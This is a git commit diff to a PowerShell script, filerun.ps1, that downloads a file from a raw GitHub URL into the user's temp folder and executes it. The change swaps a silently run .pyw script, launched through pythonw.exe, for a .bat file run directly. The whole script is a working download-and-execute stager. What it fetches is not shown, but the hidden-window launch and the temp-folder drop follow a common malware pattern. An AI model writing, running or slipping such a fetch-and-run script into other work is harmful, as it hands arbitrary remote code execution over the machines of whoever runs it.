14530366365d36fd0b445dca441570e14004b223
KevinDark5 <jotpaz@imail.edu.vn>
2025-01-09 09:11:46 +0700

    Add files via upload

--- filerun.ps1
+++ filerun.ps1
@@ -1,11 +1,11 @@
 # URL of the file to download
-$url = "https://github.com/KevinDark5/data/raw/refs/heads/main/cac.pyw"
+$url = "https://github.com/KevinDark5/data/raw/refs/heads/main/scr.bat"
 
 # Temporary file path to save the downloaded file
-$tempPath = "$env:TEMP\cac.pyw"
+$tempPath = "$env:TEMP\scr.bat"
 
 # Download the file
 Invoke-WebRequest -Uri $url -OutFile $tempPath
 
 # Execute the downloaded file
-Start-Process -FilePath "pythonw.exe" -ArgumentList $tempPath
+Start-Process -FilePath $tempPath
